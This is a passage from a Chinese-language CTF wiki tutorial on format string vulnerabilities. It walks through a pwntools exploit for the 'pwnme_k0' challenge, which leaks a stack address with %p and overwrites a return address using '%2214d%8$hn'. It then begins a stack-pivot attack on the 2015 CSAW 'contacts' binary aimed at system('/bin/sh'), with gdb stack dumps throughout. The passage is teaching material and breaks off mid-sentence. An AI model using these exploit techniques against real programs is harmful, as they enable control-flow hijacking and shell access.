call   0x400770\n   \u21b3    0x400770                  jmp    QWORD PTR [rip+0x20184a]        # 0x601fc0\n        0x400776                  xchg   ax, ax\n        0x400778                  jmp    QWORD PTR [rip+0x20184a]        # 0x601fc8\n        0x40077e                  xchg   ax, ax\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500\n0x00007fffffffdb40\u2502+0x00: 0x00007fffffffdb80  \u2192  0x00007fffffffdc30  \u2192  0x0000000000400eb0  \u2192   push r15     \u2190 $rsp, $rbp\n0x00007fffffffdb48\u2502+0x08: 0x0000000000400d74  \u2192   add rsp, 0x30\n0x00007fffffffdb50\u2502+0x10: \naaaaaaaa\n     \u2190 $rdi\n0x00007fffffffdb58\u2502+0x18: 0x000000000000000a\n0x00007fffffffdb60\u2502+0x20: 0x7025702500000000\n0x00007fffffffdb68\u2502+0x28: \n%p%p%p%p%p%p%p%pM\\r@\n\n0x00007fffffffdb70\u2502+0x30: \n%p%p%p%pM\\r@\n\n0x00007fffffffdb78\u2502+0x38: 0x0000000000400d4d  \u2192   cmp eax, 0x2\n\n\n\n\n\u53ef\u4ee5\u53d1\u73b0\u6211\u4eec\u8f93\u5165\u7684\u7528\u6237\u540d\u5728\u6808\u4e0a\u7b2c\u4e09\u4e2a\u4f4d\u7f6e\uff0c\u90a3\u4e48\u9664\u53bb\u672c\u8eab\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u4f4d\u7f6e\uff0c\u5176\u504f\u79fb\u4e3a\u4e3a5+3=8\u3002\n\n\n\u4fee\u6539\u5730\u5740\n\n\n\u6211\u4eec\u518d\u4ed4\u7ec6\u89c2\u5bdf\u4e0b\u65ad\u70b9\u5904\u6808\u7684\u4fe1\u606f\n\n\n0x00007fffffffdb40\u2502+0x00: 0x00007fffffffdb80  \u2192  0x00007fffffffdc30  \u2192  0x0000000000400eb0  \u2192   push r15     \u2190 $rsp, $rbp\n0x00007fffffffdb48\u2502+0x08: 0x0000000000400d74  \u2192   add rsp, 0x30\n0x00007fffffffdb50\u2502+0x10: \naaaaaaaa\n     \u2190 $rdi\n0x00007fffffffdb58\u2502+0x18: 0x000000000000000a\n0x00007fffffffdb60\u2502+0x20: 0x7025702500000000\n0x00007fffffffdb68\u2502+0x28: \n%p%p%p%p%p%p%p%pM\\r@\n\n0x00007fffffffdb70\u2502+0x30: \n%p%p%p%pM\\r@\n\n0x00007fffffffdb78\u2502+0x38: 0x0000000000400d4d  \u2192   cmp eax, 0x2\n\n\n\n\n\u53ef\u4ee5\u770b\u5230\u6808\u4e0a\u7b2c\u4e8c\u4e2a\u4f4d\u7f6e\u5b58\u50a8\u7684\u5c31\u662f\u8be5\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740(\u5176\u5b9e\u4e5f\u5c31\u662f\u8c03\u7528showaccounth\u51fd\u6570\u65f6\u6267\u884cpush rip\u6240\u5b58\u50a8\u7684\u503c)\uff0c\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e2d\u7684\u504f\u79fb\u4e3a7\u3002\n\n\n\u4e0e\u6b64\u540c\u65f6\u6808\u4e0a\uff0c\u7b2c\u4e00\u4e2a\u5143\u7d20\u5b58\u50a8\u7684\u4e5f\u5c31\u662f\u4e0a\u4e00\u4e2a\u51fd\u6570\u7684rbp\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u504f\u79fb0x00007fffffffdb80-0x00007fffffffdb48=0x38\u3002\u7ee7\u800c\u5982\u679c\u6211\u4eec\u77e5\u9053\u4e86rbp\u7684\u6570\u503c\uff0c\u5c31\u77e5\u9053\u4e86\u51fd\u6570\u8fd4\u56de\u5730\u5740\u7684\u5730\u5740\u3002\n\n\n0x0000000000400d74\u4e0e0x00000000004008A6\u53ea\u6709\u4f4e2\u5b57\u8282\u4e0d\u540c\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u53ea\u4fee\u65390x00007fffffffdb48\u5f00\u59cb\u76842\u4e2a\u5b57\u8282\u3002\n\n\n\u5229\u7528\u7a0b\u5e8f\n\n\n\u8fd9\u91cc\u4f7f\u7528data[1:]\u7684\u539f\u56e0\u662f\u5f53\u6211\u4eecsplit\u7684\u65f6\u5019\u7531\u4e8e\u8d77\u59cb\u7684\u662f0x\uff0c\u6240\u4ee5\u4f1a\u4ea7\u751f\u2018\u2019\u5b57\u7b26\u4e32\uff0c\u9700\u8981\u8df3\u8fc7\u3002\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\nfrom\n \nLibcSearcher\n \nimport\n \n*\n\n\npwnme\n \n=\n \nELF\n(\n./pwnme_k0\n)\n\n\nif\n \nargs\n[\nREMOTE\n]:\n\n    \nsh\n \n=\n \nremote\n(\n11\n,\n \n11\n)\n\n\nelse\n:\n\n    \nsh\n \n=\n \nprocess\n(\n./pwnme_k0\n)\n\n\nsh\n.\nrecvuntil\n(\n:\n\\n\n)\n\n\nsh\n.\nsendline\n(\na\n \n*\n \n8\n)\n\n\nsh\n.\nrecvuntil\n(\n:\n\\n\n)\n\n\nsh\n.\nsendline\n(\n%p\n \n*\n \n9\n)\n\n\nsh\n.\nrecvuntil\n(\n)\n\n\nsh\n.\nsendline\n(\n1\n)\n\n\nsh\n.\nrecvuntil\n(\na\n \n*\n \n8\n \n+\n \n\\n\n)\n\n\ndata\n \n=\n \nsh\n.\nrecvuntil\n(\n1.\n,\n \ndrop\n=\nTrue\n)\n.\nsplit\n(\n0x\n)\n\n\nprint\n \ndata\n\n\ndata\n \n=\n \ndata\n[\n1\n:]\n\n\nrbp\n \n=\n \nint\n(\ndata\n[\n5\n],\n \n16\n)\n\n\nret_addr\n \n=\n \nrbp\n \n-\n \n0x38\n\n\nsh\n.\nrecvuntil\n(\n)\n\n\nsh\n.\nsendline\n(\n2\n)\n\n\nsh\n.\nrecvuntil\n(\n:\n\\n\n)\n\n\nsh\n.\nsendline\n(\np64\n(\nret_addr\n))\n\n\nsh\n.\nrecvuntil\n(\n:\n\\n\n)\n\n\npayload\n \n=\n \n%2214d\n%8$hn\n\n\nsh\n.\nsendline\n(\npayload\n)\n\n\nsh\n.\nrecvuntil\n(\n)\n\n\nsh\n.\nsendline\n(\n1\n)\n\n\nsh\n.\ninteractive\n()\n\n\n\n\n\n\u5806\u4e0a\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\n\n\n\u539f\u7406\n\n\n\u6240\u8c13\u5806\u4e0a\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6307\u7684\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u672c\u8eab\u5b58\u50a8\u5728\u5806\u4e0a\uff0c\u8fd9\u4e2a\u4e3b\u8981\u589e\u52a0\u4e86\u6211\u4eec\u83b7\u53d6\u5bf9\u5e94\u504f\u79fb\u7684\u96be\u5ea6\uff0c\u800c\u4e00\u822c\u6765\u8bf4\uff0c\u8be5\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u90fd\u662f\u5f88\u6709\u53ef\u80fd\u88ab\u590d\u5236\u5230\u6808\u4e0a\u7684\u3002\n\n\n\u4f8b\u5b50\n\n\n\u8fd9\u91cc\u6211\u4eec\u4ee52015\u5e74CSAW\u4e2d\u7684contacts\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\n\n\n\u786e\u5b9a\u4fdd\u62a4\n\n\n\u279c  \n2015\n-CSAW-contacts git:\n(\nmaster\n)\n \u2717 checksec contacts\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE \n(\n0x8048000\n)\n\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u4e0d\u4ec5\u5f00\u542f\u4e86NX\u4fdd\u62a4\u8fd8\u5f00\u542f\u4e86Canary\u3002\n\n\n\u5206\u6790\u7a0b\u5e8f\n\n\n\u7b80\u5355\u770b\u770b\u7a0b\u5e8f\uff0c\u53d1\u73b0\u7a0b\u5e8f\u6b63\u5982\u540d\u5b57\u6240\u63cf\u8ff0\u7684\uff0c\u662f\u4e00\u4e2a\u8054\u7cfb\u4eba\u76f8\u5173\u7684\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u5b9e\u73b0\u521b\u5efa\uff0c\u4fee\u6539\uff0c\u5220\u9664\uff0c\u6253\u5370\u8054\u7cfb\u4eba\u7684\u4fe1\u606f\u3002\u800c\u518d\u4ed4\u7ec6\u9605\u8bfb\uff0c\u53ef\u4ee5\u53d1\u73b0\u5728\u8f93\u5165\u8054\u7cfb\u4eba\u4fe1\u606f\u7684\u65f6\u5019\u5b58\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u3002\n\n\nint\n \n__cdecl\n \nPrintInfo\n(\nint\n \na1\n,\n \nint\n \na2\n,\n \nint\n \na3\n,\n \nchar\n \n*\nformat\n)\n\n\n{\n\n  \nprintf\n(\n\\t\nName: %s\n\\n\n,\n \na1\n);\n\n  \nprintf\n(\n\\t\nLength %u\n\\n\n,\n \na2\n);\n\n  \nprintf\n(\n\\t\nPhone #: %s\n\\n\n,\n \na3\n);\n\n  \nprintf\n(\n\\t\nDescription: \n);\n\n  \nreturn\n \nprintf\n(\nformat\n);\n\n\n}\n\n\n\n\n\n\u4ed4\u7ec6\u770b\u770b\uff0c\u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e2aformat\u5176\u5b9e\u662f\u6307\u5411\u5806\u4e2d\u7684\u3002\n\n\n\u5229\u7528\u601d\u8def\n\n\n\u6211\u4eec\u7684\u57fa\u672c\u76ee\u7684\u662f\u83b7\u53d6\u7cfb\u7edf\u7684shell\uff0c\u4ece\u800c\u62ff\u5230flag\u3002\u5176\u5b9e\u65e2\u7136\u6709\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u6211\u4eec\u5e94\u8be5\u662f\u53ef\u4ee5\u901a\u8fc7\u52ab\u6301got\u8868\u6216\u8005\u63a7\u5236\u7a0b\u5e8f\u8fd4\u56de\u5730\u5740\u6765\u63a7\u5236\u7a0b\u5e8f\u6d41\u7a0b\u3002\u4f46\u662f\u8fd9\u91cc\u5374\u4e0d\u600e\u4e48\u53ef\u884c\u3002\u539f\u56e0\u5206\u522b\u5982\u4e0b\n\n\n\n\n\u4e4b\u6240\u4ee5\u4e0d\u80fd\u591f\u52ab\u6301got\u6765\u63a7\u5236\u7a0b\u5e8f\u6d41\u7a0b\uff0c\u662f\u56e0\u4e3a\u6211\u4eec\u53d1\u73b0\u5bf9\u4e8e\u7a0b\u5e8f\u4e2d\u5e38\u89c1\u7684\u53ef\u4ee5\u5bf9\u4e8e\u6211\u4eec\u7ed9\u5b9a\u7684\u5b57\u7b26\u4e32\u8f93\u51fa\u7684\u53ea\u6709printf\u51fd\u6570\uff0c\u6211\u4eec\u53ea\u6709\u9009\u62e9\u5b83\u624d\u53ef\u4ee5\u6784\u9020/bin/sh\u8ba9\u5b83\u6267\u884csystem('/bin/sh')\uff0c\u4f46\u662fprintf\u51fd\u6570\u5728\u5176\u4ed6\u5730\u65b9\u4e5f\u5747\u6709\u7528\u5230\uff0c\u8fd9\u6837\u505a\u4f1a\u4f7f\u5f97\u7a0b\u5e8f\u76f4\u63a5\u5d29\u6e83\u3002\n\n\n\u5176\u6b21\uff0c\u4e0d\u80fd\u591f\u76f4\u63a5\u63a7\u5236\u7a0b\u5e8f\u8fd4\u56de\u5730\u5740\u6765\u63a7\u5236\u7a0b\u5e8f\u6d41\u7a0b\u7684\u662f\u56e0\u4e3a\u6211\u4eec\u5e76\u6ca1\u6709\u4e00\u5757\u53ef\u4ee5\u76f4\u63a5\u6267\u884c\u7684\u5730\u5740\u6765\u5b58\u50a8\u6211\u4eec\u7684\u5185\u5bb9\uff0c\u540c\u65f6\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6765\u5f80\u6808\u4e0a\u76f4\u63a5\u5199\u5165system_addr+'bbbb'+addr of '/bin/sh\u2018\u4f3c\u4e4e\u5e76\u4e0d\u73b0\u5b9e\u3002\n\n\n\n\n\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u600e\u4e48\u505a\u5462\uff1f\u6211\u4eec\u8fd8\u6709\u4e4b\u524d\u5728\u6808\u6ea2\u51fa\u8bb2\u7684\u6280\u5de7\uff0cstack privot\u3002\u800c\u8fd9\u91cc\uff0c\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u7684\u6070\u597d\u662f\u5806\u5185\u5b58\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u628a\u6808\u8fc1\u79fb\u5230\u5806\u4e0a\u53bb\u3002\u8fd9\u91cc\u6211\u4eec\u901a\u8fc7leave\u6307\u4ee4\u6765\u8fdb\u884c\u6808\u8fc1\u79fb\uff0c\u6240\u4ee5\u5728\u8fc1\u79fb\u4e4b\u524d\u6211\u4eec\u9700\u8981\u4fee\u6539\u7a0b\u5e8f\u4fdd\u5b58ebp\u7684\u503c\u4e3a\u6211\u4eec\u60f3\u8981\u7684\u503c\u3002 \u53ea\u6709\u8fd9\u6837\u5728\u6267\u884cleave\u6307\u4ee4\u7684\u65f6\u5019\uff0cesp\u624d\u4f1a\u6210\u4e3a\u6211\u4eec\u60f3\u8981\u7684\u503c\u3002\u540c\u65f6\uff0c\u56e0\u4e3a\u6211\u4eec\u662f\u4f7f\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6765\u8fdb\u884c\u4fee\u6539\uff0c\u6240\u4ee5\u6211\u4eec\u5f97\u77e5\u9053\u4fdd\u5b58ebp\u7684\u5730\u5740\u4e3a\u591a\u5c11\uff0c\u800c\u8fd9\u65f6PrintInfo\u51fd\u6570\u4e2d\u5b58\u50a8ebp\u7684\u5730\u5740\u6bcf\u6b21\u90fd\u5728\u53d8\u5316\uff0c\u800c\u6211\u4eec\u4e5f\u65e0\u6cd5\u901a\u8fc7\u5176\u4ed6\u65b9\u6cd5\u5f97\u77e5\u3002\u4f46\u662f\uff0c\n\u7a0b\u5e8f\u4e2d\u538b\u5165\u6808\u4e2d\u7684ebp\u503c\u5176\u5b9e\u4fdd\u5b58\u7684\u662f\u4e0a\u4e00\u4e2a\u51fd\u6570\u7684\u4fdd\u5b58ebp\u503c\u7684\u5730\u5740\n\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4fee\u6539\u5176\n\u4e0a\u5c42\u51fd\u6570\u7684\u4fdd\u5b58\u7684ebp\u7684\u503c\uff0c\u5373\u4e0a\u4e0a\u5c42\u51fd\u6570\uff08\u5373main\u51fd\u6570\uff09\u7684ebp\u6570\u503c\n\u3002\u8fd9\u6837\u5f53\u4e0a\u5c42\u7a0b\u5e8f\u8fd4\u56de\u65f6\uff0c\u5373\u5b9e\u73b0\u4e86\u5c06\u6808\u8fc1\u79fb\u5230\u5806\u7684\u64cd\u4f5c\u3002\n\n\n\u57fa\u672c\u601d\u8def\u5982\u4e0b\n\n\n\n\n\u9996\u5148\u83b7\u53d6system\u51fd\u6570\u7684\u5730\u5740\n\n\n\u901a\u8fc7\u6cc4\u9732\u67d0\u4e2alibc\u51fd\u6570\u7684\u5730\u5740\u6839\u636elibc database\u786e\u5b9a\u3002\n\n\n\n\n\n\n\u6784\u9020\u57fa\u672c\u8054\u7cfb\u4eba\u63cf\u8ff0\u4e3asystem_addr+'bbbb'+binsh_addr\n\n\n\u4fee\u6539\u4e0a\u5c42\u51fd\u6570\u4fdd\u5b58\u7684ebp(\u5373\u4e0a\u4e0a\u5c42\u51fd\u6570\u7684ebp)\u4e3a\n\u5b58\u50a8system_addr\u7684\u5730\u5740-4\n\u3002\n\n\n\u5f53\u4e3b\u7a0b\u5e8f\u8fd4\u56de\u65f6\uff0c\u4f1a\u6709\u5982\u4e0b\u64cd\u4f5c\n\n\nmove esp,ebp\uff0c\u5c06esp\u6307\u5411system_addr\u7684\u5730\u5740-4\n\n\npop ebp\uff0c \u5c06esp\u6307\u5411system_addr\n\n\nret\uff0c\u5c06eip\u6307\u5411system_addr\uff0c\u4ece\u800c\u83b7\u53d6shell\u3002\n\n\n\n\n\n\n\n\n\u83b7\u53d6\u76f8\u5173\u5730\u5740\u4e0e\u504f\u79fb\n\n\n\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u662f\u83b7\u53d6system\u51fd\u6570\u5730\u5740\u3001/bin/sh\u5730\u5740\uff0c\u6808\u4e0a\u5b58\u50a8\u8054\u7cfb\u4eba\u63cf\u8ff0\u7684\u5730\u5740\uff0c\u4ee5\u53caPrintInfo\u51fd\u6570\u7684\u5730\u5740\u3002\n\n\n\u9996\u5148\uff0c\u6211\u4eec\u6839\u636e\u6808\u4e0a\u5b58\u50a8\u7684libc_start_main_ret\u5730\u5740(\u8be5\u5730\u5740\u662f\u5f53main\u51fd\u6570\u6267\u884c\u8fd4\u56de\u65f6\u4f1a\u8fd0\u884c\u7684\u51fd\u6570)\u6765\u83b7\u53d6system\u51fd\u6570\u5730\u5740\u3001/bin/sh\u5730\u5740\u3002\u6211\u4eec\u6784\u9020\u76f8\u5e94\u7684\u8054\u7cfb\u4eba\uff0c\u7136\u540e\u9009\u62e9\u8f93\u51fa\u8054\u7cfb\u4eba\u4fe1\u606f\uff0c\u5e76\u5c06\u65ad\u70b9\u4e0b\u5728printf\u5904\uff0c\u5e76\u4e14\u4e00\u76f4\u8fd0\u884c\u5230\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u7684printf\u51fd\u6570\u5904\uff0c\u5982\u4e0b\n\n\n \u2192 0xf7e44670 \nprintf+0\n       call   0xf7f1ab09 \n__x86.get_pc_thunk.ax\n\n   \u21b3  0xf7f1ab09 \n__x86.get_pc_thunk.ax+0\n mov    eax, DWORD PTR \n[\nesp\n]\n\n      0xf7f1ab0c \n__x86.get_pc_thunk.ax+3\n ret    \n      0xf7f1ab0d \n__x86.get_pc_thunk.dx+0\n mov    edx, DWORD PTR \n[\nesp\n]\n\n      0xf7f1ab10 \n__x86.get_pc_thunk.dx+3\n ret    \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n[\n stack \n]\n\u2500\u2500\u2500\u2500\n\n[\n0xffffccfc\n, \nl8\n]\n\n\n8\n\n0xffffccfc\u2502+0x00: 0x08048c27  \u2192   leave      \u2190 \n$esp\n\n0xffffcd00\u2502+0x04: 0x0804c420  \u2192  \n1234567\n\n0xffffcd04\u2502+0x08: 0x0804c410  \u2192  \n11111\n\n0xffffcd08\u2502+0x0c: 0xf7e5acab  \u2192  \nputs+11\n add ebx, 0x152355\n0xffffcd0c\u2502+0x10: 0x00000000\n0xffffcd10\u2502+0x14: 0xf7fad000  \u2192  0x001b1db0\n0xffffcd14\u2502+0x18: 0xf7fad000  \u2192  0x001b1db0\n0xffffcd18\u2502+0x1c: 0xffffcd48  \u2192  0xffffcd78  \u2192  0x00000000   \u2190 \n$ebp\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n[\n trace \n]\n\u2500\u2500\u2500\u2500\n\n[\n#0] 0xf7e44670 \u2192 Name: __printf(format=0x804c420 \n1234567\\n\n)\n\n\n[\n#1] 0x8048c27 \u2192 leave \n\n\n[\n#2] 0x8048c99 \u2192 add DWORD PTR [ebp-0xc], 0x1\n\n\n[\n#3] 0x80487a2 \u2192 jmp 0x80487b3\n\n\n[\n#4] 0xf7e13637 \u2192 Name: __libc_start_main(main=0x80486bd, argc=0x1, argv=0xffffce14, init=0x8048df0, fini=0x8048e60, rtld_fini=0xf7fe88a0 \n_dl_fini\n, stack_end=0xffffce0c)\n\n\n[\n#5] 0x80485e1 \u2192 hlt \n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\ngef\u27a4  dereference \n$esp\n \n140\n\n\n[\n$esp\n, \n140\n]\n\n\n1\n\n0xffffccfc\u2502+0x00: 0x08048c27  \u2192   leave      \u2190 \n$esp\n\ngef\u27a4  dereference \n$esp\n l140\n\n[\n$esp\n, \nl140\n]\n\n\n140\n\n0xffffccfc\u2502+0x00: 0x08048c27  \u2192   leave      \u2190 \n$esp\n\n0xffffcd00\u2502+0x04: 0x0804c420  \u2192  \n1234567\n\n0xffffcd04\u2502+0x08: 0x0804c410  \u2192  \n11111\n\n0xffffcd08\u2502+0x0c: 0xf7e5acab  \u2192  \nputs+11\n add ebx, 0x152355\n0xffffcd0c\u2502+0x10: 0x00000000\n0xffffcd10\u2502+0x14: 0xf7fad000  \u2192  0x001b1db0\n0xffffcd14\u2502+0x18: 0xf7fad000  \u2192  0x001b1db0\n0xffffcd18\u2502+0x1c: 0xffffcd48  \u2192  0xffffcd78  \u2192  0x00000000   \u2190 \n$ebp\n\n0xffffcd1c\u2502+0x20: 0x08048c99  \u2192   add DWORD PTR \n[\nebp-0xc\n]\n, 0x1\n0xffffcd20\u2502+0x24: 0x0804b0a8  \u2192  \n11111\n\n0xffffcd24\u2502+0x28: 0x00002b67 \n(\ng+\n?\n)\n\n0xffffcd28\u2502+0x2c: 0x0804c410  \u2192  \n11111\n\n0xffffcd2c\u2502+0x30: 0x0804c420  \u2192  \n1234567\n\n0xffffcd30\u2502+0x34: 0xf7fadd60  \u2192  0xfbad2887\n0xffffcd34\u2502+0x38: 0x08048ed6  \u2192  0x25007325 \n(\n%s\n?\n)\n\n0xffffcd38\u2502+0x3c: 0x0804b0a0  \u2192  0x0804c420  \u2192  \n1234567\n\n0xffffcd3c\u2502+0x40: 0x00000000\n0xffffcd40\u2502+0x44: 0xf7fad000  \u2192  0x001b1db0\n0xffffcd44\u2502+0x48: 0x00000000\n0xffffcd48\u2502+0x4c: 0xffffcd78  \u2192  0x00000000\n0xffffcd4c\u2502+0x50: 0x080487a2  \u2192   jmp 0x80487b3\n0xffffcd50\u2502+0x54: 0x0804b0a0  \u2192  0x0804c420  \u2192  \n1234567\n\n0xffffcd54\u2502+0x58: 0xffffcd68  \u2192  0x00000004\n0xffffcd58\u2502+0x5c: 0x00000050 \n(\nP\n?\n)\n\n0xffffcd5c\u2502+0x60: 0x00000000\n0xffffcd60\u2502+0x64: 0xf7fad3dc  \u2192  0xf7fae1e0  \u2192  0x00000000\n0xffffcd64\u2502+0x68: 0x08048288  \u2192  0x00000082\n0xffffcd68\u2502+0x6c: 0x00000004\n0xffffcd6c\u2502+0x70: 0x0000000a\n0xffffcd70\u2502+0x74: 0xf7fad000  \u2192  0x001b1db0\n0xffffcd74\u2502+0x78: 0xf7fad000  \u2192  0x001b1db0\n0xffffcd78\u2502+0x7c: 0x00000000\n0xffffcd7c\u2502+0x80: 0xf7e13637  \u2192  \n__libc_start_main+247\n add esp, 0x10\n0xffffcd80\u2502+0x84: 0x00000001\n0xffffcd84\u2502+0x88: 0xffffce14  \u2192  0xffffd00d  \u2192  \n/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/201[...]\n\n0xffffcd88\u2502+0x8c: 0xffffce1c  \u2192  0xffffd058  \u2192  \nXDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]\n\n\n\n\n\n\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u7b80\u5355\u7684\u5224\u65ad\u53ef\u4ee5\u5f97\u5230\n\n\n0xffffcd7c\u2502+0x80: 0xf7e13637  \u2192  \n__libc_start_main+247\n add esp, 0x10\n\n\n\n\n\u5b58\u50a8\u7684\u5c31\u662fmain\u76f8\u5e94\u7684\u5730\u5740\uff0c\u540c\u65f6\u5229\u7528fmtarg\u6765\u83b7\u53d6\u5bf9\u5e94\u7684\u504f\u79fb\uff0c\u53ef\u4ee5\u770b\u51fa\u5176\u504f\u79fb\u4e3a32\uff0c\u90a3\u4e48\u76f8\u5bf9\u4e8e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u4e3a31\u3002\n\n\ngef\u27a4  fmtarg 0xffffcd7c\nThe index of format argument : \n32\n\n\n\n\n\n\u8fd9\u6837\u6211\u4eec\u4fbf\u53ef\u4ee5\u5f97\u5230\u5bf9\u5e94\u7684\u5730\u5740\u4e86\u3002\u8fdb\u800c\u53ef\u4ee5\u6839\u636elibc-database\u6765\u83b7\u53d6\u5bf9\u5e94\u7684libc\uff0c\u7ee7\u800c\u83b7\u53d6system\u51fd\u6570\u5730\u5740\u4e0e/bin/sh\u51fd\u6570\u5730\u5740\u4e86\u3002\n\n\n\u5176\u6b21\uff0c\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u6808\u4e0a\u5b58\u50a8\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u5730\u57400xffffcd2c\u76f8\u5bf9\u4e8e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u4e3a6\uff0c\u5f97\u5230\u8fd9\u4e2a\u662f\u4e3a\u4e86\u6784\u9020\u6211\u4eec\u7684\u8054\u7cfb\u4eba\u3002\n\n\n\u518d\u8005\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\u4e0b\u9762\u7684\u5730\u5740\u4fdd\u5b58\u7740\u4e0a\u5c42\u51fd\u6570\u7684\u8c03\u7528\u5730\u5740\uff0c\u5176\u76f8\u5bf9\u4e8e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u4e3a11\uff0c\u8fd9\u6837\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u4fee\u6539\u4e0a\u5c42\u51fd\u6570\u5b58\u50a8\u7684ebp\u7684\u503c\u3002\n\n\n0xffffcd18\u2502+0x1c: 0xffffcd48  \u2192  0xffffcd78  \u2192  0x00000000   \u2190 \n$ebp\n\n\n\n\n\n\u6784\u9020\u8054\u7cfb\u4eba\u83b7\u53d6\u5806\u5730\u5740\n\n\n\u5f97\u77e5\u4e0a\u9762\u7684\u4fe1\u606f\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u4e0b\u9762\u7684\u65b9\u5f0f\u83b7\u53d6\u5806\u5730\u5740\u4e0e\u76f8\u5e94\u7684ebp\u5730\u5740\u3002\n\n\n[system_addr][bbbb][binsh_addr][%6$p][%11$p][bbbb]\n\n\n\n\n\u6765\u83b7\u53d6\u5bf9\u5e94\u7684\u76f8\u5e94\u7684\u5730\u5740\u3002\u540e\u9762\u7684bbbb\u662f\u4e3a\u4e86\u63a5\u53d7\u5b57\u7b26\u4e32\u65b9\u4fbf\u3002\n\n\n\u8fd9\u91cc\u56e0\u4e3a\u51fd\u6570\u8c03\u7528\u65f6\u6240\u7533\u8bf7\u7684\u6808\u7a7a\u95f4\u4e0e\u91ca\u653e\u7684\u7a7a\u95f4\u662f\u4e00\u81f4\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u5f97\u5230\u7684ebp\u5730\u5740\u5e76\u4e0d\u4f1a\u56e0\u4e3a\u6211\u4eec\u518d\u6b21\u8c03\u7528\u800c\u6539\u53d8\u3002\n\n\n\u4fee\u6539ebp\n\n\n\u7531\u4e8e\u6211\u4eec\u9700\u8981\u6267\u884cmove\u6307\u4ee4\u5c06ebp\u8d4b\u7ed9esp\uff0c\u5e76\u8fd